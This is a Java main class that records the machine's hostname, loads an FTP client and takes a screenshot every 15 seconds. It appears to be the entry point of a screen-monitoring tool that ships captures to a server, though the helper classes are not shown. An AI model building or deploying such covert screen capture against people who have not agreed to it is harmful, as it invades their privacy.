package fr.mimifan.jac;

import fr.mimifan.jac.screens.ScreenShotter;
import fr.mimifan.jac.ftp.FileTransferClient;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Main {

    public static String hostname = "";

    public static void main(String[] args) throws UnknownHostException {
        InetAddress localhost = InetAddress.getLocalHost();
        hostname = localhost.getHostName();

        FileTransferClient.getInstance().load();
        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);
    }

}
